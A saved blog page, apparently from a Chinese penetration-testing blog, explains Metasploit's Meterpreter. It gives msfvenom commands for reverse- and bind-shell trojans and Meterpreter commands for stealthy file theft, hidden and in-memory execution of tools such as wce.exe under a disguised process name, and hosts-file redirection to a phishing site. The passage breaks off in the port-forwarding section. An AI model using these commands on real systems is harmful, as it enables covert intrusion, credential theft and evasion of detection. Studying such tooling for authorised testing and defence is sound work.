<!DOCTYPE html>
<html lang="zh-cn"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="origin">
    <meta property="og:description" content="0x01初识Meterpreter 1.1.什么是Meterpreter Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Meterpreter命令详解 - 渗透测试中心 - 博客园</title>
    <link id="favicon" rel="shortcut icon" href="https://common.cnblogs.com/favicon.ico?v=20200522" type="image/x-icon">
    
    <link rel="stylesheet" href="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/blog-common.css">
    <link id="MainCss" rel="stylesheet" href="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/bundle-coffee.css">
    
    <link id="mobile-style" media="only screen and (max-width: 767px)" type="text/css" rel="stylesheet" href="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/bundle-coffee-mobile.css">
    
    <link type="application/rss+xml" rel="alternate" href="https://www.cnblogs.com/backlion/rss">
    <link type="application/rsd+xml" rel="EditURI" href="https://www.cnblogs.com/backlion/rsd.xml">
    <link type="application/wlwmanifest+xml" rel="wlwmanifest" href="https://www.cnblogs.com/backlion/wlwmanifest.xml">
    <script async="" src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/analytics.js"></script><script>
        var currentBlogId = 313482;
        var currentBlogApp = 'backlion';
        var cb_enable_mathjax = false;
        var isLogined = false;
        var isBlogOwner = false;
        var skinName = 'coffee';
        var visitorUserId = '';
    </script>
        <script>
            var currentPostDateAdded = '2018-08-16 02:56';
        </script>
    <script src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/jquery-2.js"></script>
    <script src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/blog-common.js"></script>
    
    
    
</head>
<body>
    <a name="top"></a>
    
    
<!--done-->
<div id="home">
<div id="header">
	<div id="blogTitle">
	<a href="https://www.cnblogs.com/backlion/"><img id="blogLogo" src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/logo.gif" alt="返回主页"></a>			
		
<!--done-->
<h1><a id="Header1_HeaderTitle" class="headermaintitle HeaderMainTitle" href="https://www.cnblogs.com/backlion/">渗透测试中心</a>
</h1>
<h2>

</h2>




		
	</div><!--end: blogTitle 博客的标题和副标题 -->
</div><!--end: header 头部 -->

<div id="main">
	<div id="mainContent">
	<div class="forFlow">
		<div id="navigator">
			
<ul id="navList">
	<li><a id="blog_nav_sitehome" class="menu" href="https://www.cnblogs.com/">
博客园</a>
</li>
	<li>
<a id="blog_nav_myhome" class="menu" href="https://www.cnblogs.com/backlion/">
首页</a>
</li>
	<li>

<a id="blog_nav_newpost" class="menu" href="https://i.cnblogs.com/EditPosts.aspx?opt=1">
新随笔</a>
</li>
	<li>
<a id="blog_nav_contact" class="menu" href="https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83">
联系</a></li>
	<li>
<a id="blog_nav_admin" class="menu" href="https://i.cnblogs.com/">
管理</a>
</li>
	<li>
<a id="blog_nav_rss" class="menu" href="javascript:void(0)" data-rss="https://www.cnblogs.com/backlion/rss/">
订阅</a>
	
<a id="blog_nav_rss_image" href="https://www.cnblogs.com/backlion/rss/">
    <img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/xml.gif" alt="订阅">
</a></li>
</ul>



			<div class="blogStats">
				
				<!--done-->
随笔- 
185&nbsp;
文章- 
1&nbsp;
评论- 
35&nbsp;



				
			</div><!--end: blogStats -->
		</div><!--end: navigator 博客导航栏 -->
		<div id="post_detail">
<!--done-->
<div id="topics">
	<div class="post">
		<h1 class="postTitle">
			
<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/backlion/p/9484949.html">
    <span>Meterpreter命令详解</span>
    


</a>

		</h1>
		<div class="clear"></div>
		<div class="postBody">
			
<div id="cnblogs_post_body" class="blogpost-body">
    <div>&nbsp;</div>
<h2>0x01初识Meterpreter</h2>
<p><span lang="EN-US">1.1.</span>什么是Meterpreter</p>
<p><span lang="EN-US">&nbsp; Meterpreter</span>是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个<span lang="EN-US&gt;">Meterpreter shell</span>的链接。Meterpreter shell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开<span lang="EN-US&gt;">shell</span>、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和<span lang="EN-US&gt;">IP</span>地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己<span lang="EN-US&gt;">,</span>它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统<span lang="EN-US&gt;">]</span>很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。</p>
<p><span lang="EN-US">&nbsp;&nbsp;</span>最后<span lang="EN-US&gt;">,Meterpreter</span>还可以简化任务创建多个会话。可以来利用这些会话进行渗透。在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型<span lang="EN-US&gt;">Payload</span>。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的<span lang="EN-US&gt;">DLL</span>来让目标系统运行注入的DLL文件。其中，攻击者与目标设备中<span lang="EN-US&gt;">Meterpreter</span>的通信是通过Stager套接字实现的<span lang="EN-US&gt;">meterpreter</span>作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。</p>
<p><span lang="EN-US">&nbsp;</span>需要说明的meterpreter在漏洞利用成功后会发送第二阶段的代码和<span lang="EN-US&gt;">meterpreter</span>服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行<span lang="EN-US&gt;">help</span>之后发现缺少命令。 连上vpn又在内网中使用<span lang="EN-US&gt;">psexec</span>和bind_tcp的时候经常会出现这种情况</p>
<p><span lang="EN-US">1.2.Meterpreter</span>技术优势</p>
<p><span lang="EN-US">&nbsp; Metasploit</span>提供了各个主流平台的Meterpreter版本，包括<span lang="EN-US&gt;">Windows</span>、Linux，同时支持x86、<span lang="EN-US&gt;">x64</span>平台，另外，Meterpreter还提供了基于<span lang="EN-US&gt;">PHP</span>和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，<span lang="EN-US&gt;">Meterpreter</span>还支持Ruby脚本形式的扩展。所以<span lang="EN-US&gt;">Ruby</span>语言还很有必要。</p>
<h2>0x02 Meterpreter中常用的反弹类型</h2>
<p><span lang="EN-US">1.reverse_tcp</span></p>
<p>这是一个基于TCP的反向链接反弹<span lang="EN-US&gt;">shell, </span>使用起来很稳定</p>
<p>（<span lang="EN-US&gt;">1</span>）Linux：</p>
<p>使用下列命令生成一个Linux下反弹<span lang="EN-US&gt;">shell</span>木马：</p>
<p><span lang="EN-US">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444&nbsp; -f elf -o shell</span></p>
<p>看上图，我们可以看见目录下已经成功生成木马文件isshell。然后我们给文件加上可执行权限。然后我们打开<span lang="EN-US&gt;">Metasploit</span>，使用模块handler，设置<span lang="EN-US&gt;">payload</span>，注意：这里设置的payload要和我们生成木马所使用的<span lang="EN-US&gt;">payload</span>一样。</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025458011-473731884.gif" alt="" width="554" height="376"></span></p>
<p>设置下地址和端口，我们就开始监听了</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025458562-1367381786.gif" alt="" width="554" height="376"></span></p>
<p>这边运行一下我们的反弹shell木马，可以发现成功反弹回<span lang="EN-US&gt;">shell</span>了</p>
<p>（<span lang="EN-US&gt;">2</span>）Windows：</p>
<p><span lang="EN-US">msfvenom -p windows/meterpreter/reverse_tcp lhost=[</span>你的IP] lport=[端口<span lang="EN-US&gt;">] -f exe -o </span>要生成的文件名</p>
<p><span lang="EN-US">msfvenom -p &nbsp;windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444&nbsp; -f exe -o &nbsp;shell.exe</span></p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025459101-2013398451.gif" alt="这里写图片描述" width="553" height="214"></span></p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025459414-1360054945.gif" alt="这里写图片描述" width="554" height="68"></span><br>反向连接shell,使用起来很稳定，需要设置<span lang="EN-US&gt;">LHOST</span></p>
<p><span lang="EN-US">2.reverse_http</span></p>
<p>基于http方式的反向连接，在网速慢的情况下不稳定。</p>
<p><span lang="EN-US">payload:/windows/meterpreter/reverse_http</span></p>
<p><span lang="EN-US">3.reverse_https</span></p>
<p>基于https方式的反向连接，在网速慢的情况下不稳定， https如果反弹没有收到数据，可以将监听端口换成<span lang="EN-US&gt;">443</span>试试</p>
<p><span lang="EN-US">payload:/windows/meterpreter/reverse_https</span></p>
<p><span lang="EN-US">&nbsp;</span></p>
<p><span lang="EN-US">4.bind_tcp</span></p>
<p>这是一个基于TCP的正向连接<span lang="EN-US&gt;">shell</span>，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置<span lang="EN-US&gt;">LHOST</span>。</p>
<p>使用下列命令生成木马：</p>
<p><span lang="EN-US">msfvenom -p linux/x86/meterpreter/bind_tcp
lport=4444&nbsp; -f elf -o shell</span></p>
<p>同样道理加权限运行，不演示了。</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025459988-65954721.gif" alt="" width="554" height="296"></span></p>
<p>这里注意，我们设置的IP地址和端口就是目标机的。因为这是我们主动来连接它。</p>
<h2>0x03 相关Payload</h2>
<p>Payload中包含有需要在远程系统中运行的恶意代码，而在<span lang="EN-US&gt;">Metasploit</span>中Payload是一种特殊模块，它们能够以漏洞利用模块运行，并能够利用目标系统中的安全漏洞实施攻击。简而言之，这种漏洞利用模块可以访问目标系统，而其中的代码定义了<span lang="EN-US&gt;">Payload</span>在目标系统中的行为。</p>
<p>Metasploit中的Payload模块主要有以下三种类型：</p>
<p>-Single</p>
<p>-Stager</p>
<p>-Stage</p>
<p>Single是一种完全独立的Payload，而且使用起来就像运行<span lang="EN-US&gt;">calc.exe</span>一样简单，例如添加一个系统用户或删除一份文件。由于Single
Payload是完全独立的，因此它们有可能会被类似<a href="https://en.wikipedia.org/wiki/Netcat">netcat</a>这样的非metasploit处理工具所捕捉到。</p>
<p>Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的<span lang="EN-US&gt;">Stagers Payload</span>就是reverse_tcp，它可以让目标系统与攻击者建立一条<span lang="EN-US&gt;">tcp</span>连接。另一种常见的是bind_tcp，它可以让目标系统开启一个<span lang="EN-US&gt;">tcp</span>监听器，而攻击者随时可以与目标系统进行通信。</p>
<p>Stage是Stager
Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</p>
<p>在Metasploit中，我们可以通过<span lang="EN-US&gt;">Payload</span>的名称和使用格式来推断它的类型：</p>
<div>
<p>Single Payload的格式为&lt;target&gt;/ <span lang="EN-US">&lt;single&gt;</span></p>
<p>Stager/Stage Payload的格式为&lt;target&gt;/ <span lang="EN-US">&lt;stage&gt;</span> / <span lang="EN-US">&lt;stager&gt;</span></p>

</div>
<p>当我们在Metasploit中执行“<span lang="EN-US&gt;">show payloads</span>”命令之后，它会给我们显示一个可使用的Payload列表：</p>
<p><a href="http://image.3001.net/images/20171121/15112655193820.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025501025-1553854514.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="477" border="0"></a></p>
<p>在这个列表中，windows/powershell_bind_tcp就是一个<span lang="EN-US&gt;">Single Payload</span>，它不包含Stage Payload。而<span lang="EN-US&gt;">windows/x64/meterpreter/reverse_tcp</span>则由一个Stager
Payload（reverse_tcp）和一个Stage Payload（<span lang="EN-US&gt;">meterpreter</span>）组成。</p>
<h2>0x04 Meterpreter的常用命令</h2>
<p><span lang="EN-US">1.</span>基本命令</p>
<div>
<p>help# 查看Meterpreter帮助</p>
<p>&nbsp;</p>
<p>background#返回，把<span lang="EN-US">meterpreter</span>后台挂起</p>
<p>bgkill# 杀死一个背景 meterpreter 脚本</p>
<p>bglist#提供所有正在运行的后台脚本的列表</p>
<p>bgrun#作为一个后台线程运行脚本</p>
<p>&nbsp;</p>
<p>channel#显示活动频道</p>
<p>sessions -i number # 与会话进行交互，<span lang="EN-US">number</span>表示第<span lang="EN-US">n</span>个<span lang="EN-US">session,</span>使用<span lang="EN-US">session -i </span>连接到指定序号的meterpreter会话已继续利用</p>
<p>sesssions -k&nbsp; number
#与会话进行交互</p>
<p>close# 关闭通道</p>
<p>exit# 终止 meterpreter 会话</p>
<p>quit# 终止 meterpreter 会话</p>
<p>interact id #切换进一个信道</p>
<p>&nbsp;</p>
<p>run#执行一个已有的模块，这里要说的是输入<span lang="EN-US">run</span>后按两下<span lang="EN-US">tab</span>，会列出所有的已有的脚本，常用的有<span lang="EN-US">autoroute,hashdump,arp_scanner,multi_meter_inject</span>等</p>
<p>&nbsp;</p>
<p>irb# 进入 Ruby 脚本模式</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>read# 从通道读取数据</p>
<p>write# 将数据写入到一个通道</p>
<p>&nbsp;</p>
<p>run和bgrun# 前台和后台执行以后它选定的<span lang="EN-US"> meterpreter </span>脚本</p>
<p>use# 加载 meterpreter 的扩展</p>
<p>load/use#加载模块</p>
<p>&nbsp;</p>
<p>Resource#执行一个已有的rc脚本</p>

</div>
<p><span lang="EN-US">2.</span>文件系统命令</p>
<div>
<p>cat c:\boot.ini#查看文件内容<span lang="EN-US">,</span>文件必须存在</p>
<p>del c:\boot.ini #删除指定的文件</p>
<p>upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload&nbsp; setup.exe
C:\\windows\\system32\ </p>
<p>download nimeia.txt /root/Desktop/&nbsp;&nbsp; # 下载文件到本机上如：<span lang="EN-US">download C:\\boot.ini /root/</span>或者download
C:\\"ProgramFiles"\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db
/root/</p>
<p>edit c:\boot.ini&nbsp; #
编辑文件</p>
<p>getlwd#打印本地目录</p>
<p>getwd#打印工作目录</p>
<p>lcd#更改本地目录</p>
<p>ls#列出在当前目录中的文件列表</p>
<p>lpwd#打印本地目录</p>
<p>pwd#输出工作目录</p>
<p>cd c:\\ #进入目录文件下</p>
<p>rm file #删除文件</p>
<p>mkdir dier #在受害者系统上的创建目录</p>
<p>rmdir#受害者系统上删除目录</p>
<p>dir#列出目标主机的文件和文件夹信息</p>
<p>mv#修改目标主机上的文件名</p>
<p>search -d d:\\www -f web.config #search 文件，如search&nbsp; -d c:\\&nbsp; -f*.doc</p>
<p>meterpreter &gt; search -f autoexec.bat&nbsp; #搜索文件</p>
<p>meterpreter &gt; search -f sea*.bat c:\\xamp\\</p>
<p>enumdesktops&nbsp;&nbsp;&nbsp;&nbsp; #用户登录数</p>

</div>
<p>(1)下载文件</p>
<p>使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/205521203.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025501575-714101040.gif" alt="" width="524" height="69" border="0"></a></span></p>
<p>(2)上传文件</p>
<p>“upload”命令为上传文件到我们的目标机器，在图中我们上传了<span lang="EN-US&gt;">ll.txt</span>到目标机器的c:\pp\下。</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/205723892.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025501957-1931308778.gif" alt="" width="478" height="71" border="0"></a></span></p>
<p>(3)查看文件</p>
<p>“cat filename”在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/205738246.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025502211-607228724.gif" alt="" width="454" height="42" border="0"></a></span></p>
<p>(4)切换、查询当前路径</p>
<p>“pwd”命令将查询当前在dos命令下的路径，“<span lang="EN-US&gt;">cd</span>”命令可以改变当前路径，如下图中cd ..为切换到当前路径下的上一目录。</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/205753548.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025502526-1553731175.gif" alt="" width="524" height="97" border="0"></a></span></p>
<p>(5)“<span lang="EN-US&gt;">sysinfo</span>”命令</p>
<p>“sysinfo”命令为显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是<span lang="EN-US&gt;">windows XP service pack 2</span>，sp2这个系统有很多漏洞。</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/205806772.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025502895-1475428553.gif" alt="" width="569" height="121" border="0"></a></span></p>
<p>(6)execute命令</p>
<p>“execute”命令为目标主机上执行一个命令，其中“<span lang="EN-US&gt;">execute -h</span>”显示帮助信息。-f为执行要运行的命令<span lang="EN-US&gt;">,</span></p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/210000715.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025503555-946336430.gif" alt="" width="550" height="310" border="0"></a></span></p>
<p>在目标主机上运行某个程序,例如我们目前注入进程到<span lang="EN-US&gt;">explorer.exe</span>后，运行用户为超级管理administrator</p>
<p>我们运行一下目标主机上的记事本程序</p>
<p><span lang="EN-US">execute&nbsp; -f&nbsp;notepad.exe</span></p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025503797-1918223584.gif" alt="" width="534" height="39"></span><br>目标主机上立马弹出来一个记事本程序，如下图：<span lang="EN-US&gt;"><br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025504353-765597276.gif" alt="" width="554" height="304"><br></span>这样太明显，如果希望隐藏后台执行，加参数-H</p>
<p><span lang="EN-US">execute&nbsp; -H -f&nbsp;notepad.exe</span></p>
<p>此时目标主机桌面没反应，但我们在meterpreter会话上使用<span lang="EN-US&gt;">ps</span>命令看到了<br><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025504919-349237318.gif" alt="" width="554" height="167"><br>再看一个，我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的<span lang="EN-US&gt;">meterpreter</span>会话上</p>
<p>命令：</p>
<p><span lang="EN-US">execute&nbsp; -H -i -f&nbsp;cmd.exe</span></p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025505245-493104547.gif" alt="" width="440" height="120"></span></p>
<p>这达到的效果就跟使用shell命令一样了</p>
<p>再来一个，在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀。</p>
<p><span lang="EN-US">execute&nbsp; -H -m -d notepad.exe-f&nbsp; wce.exe -a
"-o&nbsp;wce.txt"</span></p>
<p><span lang="EN-US">-d </span>在目标主机执行时显示的进程名称（用以伪装）</p>
<p><span lang="EN-US">-m </span>直接从内存中执行</p>
<p><span lang="EN-US">&nbsp;"-o&nbsp;wce.txt"</span>是wce.exe的运行参数</p>
<p>(7)idletime命令</p>
<p>“idletime”命令为显示目标机器截止到当前无操作命令的时间。图中的显示意思为目标主机有操作是在<span lang="EN-US&gt;">9</span>分19秒之前。</p>
<p><span lang="EN-US&gt;"><a href="http://blog.51cto.com/attachment/201301/210030397.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025505524-765838553.gif" alt="" width="483" height="45" border="0"></a></span></p>
<p>(8)search命令</p>
<p>“search“命令在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。</p>
<p>使用“search –h”命令来查看<span lang="EN-US&gt;">search</span>命令的帮助信息：</p>
<p>下图中，“search –f aa.txt”命令为查看目标机中在当前目录以及当前目录的子目录中有没有<span lang="EN-US&gt;">aa.txt</span>这个文件，若有则显示出其路径。</p>
<p>“search –f l*.txt c:\\pp”为显示出<span lang="EN-US&gt;">c:\\pp</span>下及pp文件夹下所有的子文件下所有以<span lang="EN-US&gt;">l</span>开头的txt文件，若有此类文件，则返回其路径和其大小。</p>
<p>(9)edit命令</p>
<p>调用vi编辑器，对目标主机上的文件修改</p>
<p>例如修改目标主机上的hosts文件，使得目标主机访问<span lang="EN-US&gt;">baidu</span>时去到准备好的钓鱼网站（仅限实验用途）</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025505961-25073432.gif" alt="" width="647" height="119"><br>在目标主机上ping www.baidu.com，出来的目标<span lang="EN-US&gt;">IP</span>就是我们修改的192.168.1.1了<span lang="EN-US&gt;"><br></span><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025506153-1782302168.gif" alt="" width="526" height="53"></p>
<p><span lang="EN-US">3.</span>网络命令</p>
<div>
<p>ipconfig/ifconfig#显示网络接口的关键信息，包括<span lang="EN-US"> IP </span>地址</p>
<p>portfwd -h</p>
<p>用法：<span lang="EN-US">portfwd&nbsp;[-h]&nbsp;[add&nbsp;|&nbsp;delete&nbsp;|&nbsp;list&nbsp;|&nbsp;flush]&nbsp;[args]</span></p>
<p>&nbsp;</p>
<p>选项：</p>
<p>&nbsp;&nbsp;&nbsp; -L &lt;opt&gt;要监听的本地主机（可选）</p>
<p>&nbsp;&nbsp;&nbsp; -h帮助横幅</p>
<p>&nbsp;&nbsp;&nbsp; -l &lt;opt&gt;要监听的本地端口</p>
<p>&nbsp;&nbsp;&nbsp; -p &lt;opt&gt;连接到的远程端口</p>
<p>&nbsp;&nbsp;&nbsp; -r &lt;opt&gt;要连接到的远程主机</p>
<p>portfwd&nbsp; add -l
4444 -p 3389 -r 192.168.1.102 # 端口转发<span lang="EN-US">,</span>本机监听<span lang="EN-US">4444,</span>把目标机<span lang="EN-US">3389</span>转到本机<span lang="EN-US">4444</span></p>
<p>netstat -an | grep“4444"&nbsp; #查看指定端口开放情况</p>
<p>rdesktop -u Administrator -p bk#123 127.0.0.1:4444 #使用rdesktop来连接桌面，-u 用户名<span lang="EN-US"> -p </span>密码</p>
<p>rdesktop 127.1.1.0:4444 #需要输入用户名和密码远程连接</p>
<p>route#查看或修改受害者路由表</p>
<p>route add 192.168.1.0 255.255.255.0 1 #添加动态路由</p>
<p>route print #路由表输出</p>
<p>runget_local_subnets #目标主机的内网IP段情况</p>
<p>Arp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #看ARP缓冲表</p>
<p>Getproxy&nbsp;&nbsp;&nbsp;&nbsp; #获取代理</p>

</div>
<p>（<span lang="EN-US&gt;">1</span>）portfwd</p>
<p>网络命令则有列出ip信息(ipconfig),展示修改路由表<span lang="EN-US&gt;">(route),</span>还有端口转发(portfwd)。 比如<span lang="EN-US&gt;">portfwd</span>：</p>
